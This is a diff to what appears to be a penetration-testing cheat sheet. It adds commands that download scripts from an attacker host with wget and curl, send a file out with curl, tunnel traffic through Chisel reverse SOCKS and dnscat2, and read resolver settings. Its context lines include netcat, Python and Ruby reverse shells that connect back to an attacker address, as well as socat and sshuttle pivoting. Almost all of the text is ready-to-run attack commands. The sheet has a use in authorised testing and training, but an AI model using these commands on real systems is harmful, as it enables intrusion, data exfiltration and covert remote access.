@@ -2,6 +2,15 @@
 python3 -m http.server 1234
 nc -lnvp 1234
 
+#Get files
+wget http://192.168.12.34/badstuff.sh
+curl -L http://192.168.12.34/badfile.sh > badfile.sh
+
+#Send data out over HTTP
+curl --data @/tmp/badfile http://192.168.12.34:8008/
+
+----
+
 ##Reverse shell
 On target: 
 nc 123.123.123.1 1234 -e /bin/bash
@@ -17,6 +26,8 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 
 On listening host: nc -lvnp 1234
+
+----
 
 #Create a forwarder listening on port 1234 forwarding to 10.0.20.1:4321
 socat -ddd TCP-LISTEN:1234,fork TCP:10.0.20.1:4321
@@ -58,6 +69,26 @@ socat TCP-LISTEN:1234,fork TCP:10.0.20.1:22
 sshuttle -r user@192.168.11.11:1234 10.0.20.0/24 172.16.0.0/24
 #Then all connections from your host over to 10.0.20.0/24 or 172.16.0.0/24 should flow through the tunnel
 
+#Using Chisel (https://github.com/jpillora/chisel)
+#Run a Chisel server on your host, bound on port 8080 and enabling reverse port forwarding
+#by default when running Chisel server reverse port forwarding the socks proxy is bound to TCP 1080
+chisel server --port 8008 --reverse
+#On the other end use client and connect to your Chisel server, start the reverse forwarding socks
+chisel client 192.168.12.34:8008 R:socks > /dev/null 2>&1 &
+#Passing proxy command to ssh connection to 10.0.20.1 on your host, as ncat using socks5 proxy on host port 1080 
+#%h representing the ssh command's host filled in before running the proxy command and %p representing the ssh password
+#by default when running Chisel server reverse port forwarding the socks proxy is bound to TCP 1080
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@10.0.20.1
+
+#Using dnscat2 (requires you to have your own domain and run the authoritative ns yourself) https://github.com/iagox86/dnscat2
+dnscat2-server yourdomain.tld
+#Leveragin listen
+#Local post forward listening on 4444 loopback and forwarding to 10.0.20.1 port 445
+window -i 1 (first check with "windows" how many you already have, by default there's only window 0)
+listen 127.0.0.1:4444 172.16.2.11:445
+#Make for example and SMB request through dnscat running listen on 4444
+smbclient -p 4444 -L //127.0.0.1 -U user --password=passw
+
 ----
 
 #Version info
@@ -70,6 +101,10 @@ arch
 #Network connections
 netstat -tulpn
 ss -tulpn
+
+#Resolvers
+cat /etc/resolv.conf
+resolvectl status
 
 #Users and in some case passwords can be found in /etc/passwd, which can be exploited if for some reason you have writes to this file
 #/etc/passwd passwords precede /etc/shadow ones
